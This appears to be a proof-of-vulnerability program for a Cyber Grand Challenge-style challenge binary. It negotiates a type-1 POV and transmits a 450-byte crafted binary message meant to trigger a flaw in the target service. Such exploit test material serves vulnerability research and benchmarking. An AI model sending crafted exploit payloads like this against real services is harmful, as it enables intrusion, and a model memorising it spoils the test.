#include <libpov.h>
int main(void) {
   negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x31\x73\x31\x73\x00\x00\x00\x13\x83\x7e\x1c\xd8\x7a\x98\x5c\xe8"
         "\xc0\xcf\x03\x00\x01\x00\x06\x00\x28\x37\xd4\xc8\x23\xf6\x31\x73"
         "\x31\x73\x00\x00\x00\x13\x83\x7e\x1c\xd8\x7a\x98\x5c\xe8\xc0\xcf"
         "\x01\x00\x05\x00\xad\x00\x56\xc6\xd4\x6a\x79\x2d\x99\x74\xcc\xea"
         "\xad\xe1\x02\x4f\x76\x01\xab\x03\x84\xa9\xc9\xc8\xbf\xe5\x4c\xa5"
         "\xb9\x38\x06\x9c\x5a\xe5\xef\x6b\xdb\xb8\x92\xb8\x8c\x24\x0e\x9e"
         "\xf6\x75\x2f\x54\xf4\x7d\x17\x10\xbf\x06\xa7\xda\xa5\xb3\x01\x08"
         "\x8f\x91\x2b\xa9\x25\x48\x3d\xe5\x48\x81\xf2\xec\x79\x61\xd1\x80"
         "\x5a\x98\xb7\xe1\xb9\x2f\x0b\xcf\xea\xe6\xe3\x5b\xe0\x4f\x67\x5e"
         "\x12\xd9\x15\x4e\xf8\x05\x8f\xf8\xcc\xb9\x08\xd9\x73\x57\x04\x55"
         "\x73\xc0\x6d\x29\xa5\x6f\x19\x12\x05\xb4\xcf\x9d\x3d\xd4\x46\xfd"
         "\x36\x69\x95\x1d\xbc\xe1\x64\xb8\x4e\xd4\x29\x8b\xb7\x6e\x2c\xbe"
         "\x58\x24\x02\xce\x15\xc9\x84\x6b\x7b\xa4\x4a\x70\x9f\xc5\x1b\x1d"
         "\x72\x54\x5b\xa5\x8e\x70\xbb\xbf\x57\x44\x55\xa2\xf7\x79\x3b\x04"
         "\x4c\x12\x43\x31\x73\x31\x73\x00\x00\x00\x13\x83\x7e\x1c\xd8\x7a"
         "\x98\x5c\xe8\xc0\xcf\x00\x00\x05\x00\x81\x00\x7b\xfb\xfe\x21\x0f"
         "\x8e\x40\x18\x84\x6e\xeb\xef\x96\xf3\xbd\x65\x7d\xec\x9a\xf7\x51"
         "\xbb\xc1\x74\x8c\xb0\xc9\xe2\xdd\xab\x08\xbe\xc8\xb6\xa1\xff\x07"
         "\x65\xa6\x6e\xc3\x00\x45\x8e\x9d\xc1\x2a\xae\x30\x5a\x6f\x95\x64"
         "\x22\x09\xa1\x07\x1e\x19\xbd\x6b\x64\x20\xd1\x80\xee\xd9\xb6\x42"
         "\xe0\xa8\xaf\xd3\x5a\xb3\x05\x75\x42\x5d\xee\x5f\x50\x8b\x61\xed"
         "\xbd\xe6\xc1\xd1\xbb\xb1\xdd\xd3\xa8\xfb\x91\x18\x0f\xb6\xc9\x8d"
         "\x7e\x59\x56\x8b\x23\x09\x16\x49\x7a\xba\x6f\x48\x3f\x7e\xfb\xae"
         "\xb9\x7e\x7c\xb9\xe6\x37\xb1\x98\xc0\x0e\xbd\x8c\x31\x73\x31\x73"
         "\x00\x00\x00\x13\x83\x7e\x1c\xd8\x7a\x98\x5c\xe8\xc0\xcf\x02\x00"
         "\x05\x00\x14\x00\x48\xc8\x55\xd4\xc4\x54\x05\xcb\xbc\xae\xdb\x19"
         "\xa3\xd8\x82\x67\xb8\x86\x24\xfa\x31\x73\x31\x73\x00\x00\x00\x13"
         "\x83\x7e\x1c\xd8\x7a\x98\x5c\xe8\xc0\xcf\x04\x00\x05\x00\x02\x00"
         "\xf2\xa3";
      static unsigned int write_00000_00000_len = 450;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);
}
